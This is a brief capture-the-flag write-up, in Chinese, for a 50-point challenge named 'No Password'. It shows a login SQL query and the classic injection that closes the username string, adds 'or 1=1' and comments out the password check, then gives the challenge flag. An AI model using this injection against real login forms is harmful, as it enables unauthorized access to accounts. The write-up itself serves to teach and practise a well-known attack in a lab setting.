# No Password [50]

題目提供兩個欄位做輸入，分別為 username 和 password。輸入完後會執行下列SQL instruction
```
SELECT * FROM user WHERE ( username = "" ) AND ( password = "" )
```

變法讓 username 閉合後輸入一個一定正確的半段式就行了，之後的部份用註解的形式迴避。

```
SELECT * FROM user WHERE ( username = "admin" or 1=1 ) -- " ) AND ( password = "" )
```

`FLAG{baby_first_sqlinj}`

